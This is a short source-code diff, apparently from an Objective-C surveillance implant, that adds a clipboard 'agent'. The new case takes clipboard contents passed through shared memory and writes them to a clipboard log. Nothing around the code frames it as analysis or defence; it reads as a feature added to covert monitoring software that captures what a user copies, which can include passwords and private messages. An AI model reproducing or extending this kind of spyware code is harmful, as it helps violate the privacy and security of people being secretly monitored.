@@ -334,6 +334,24 @@ RCSISharedMemory  *mSharedMemoryLogging;
                 
                 break;
               }
+            case AGENT_CLIPBOARD:
+              {
+                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
+                NSMutableData *clipData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                                        length: shMemLog->commandDataSize];
+                
+                if ([_logManager writeDataToLog: clipData
+                                       forAgent: LOG_CLIPBOARD
+                                      withLogID: 0] == TRUE)
+                {
+#ifdef DEBUG
+                  NSLog(@"%s: clipboard logged correctly", __FUNCTION__);
+#endif
+                }
+                
+                [clipData release];
+                break;
+              }
             default:
               {
 #ifdef DEBUG
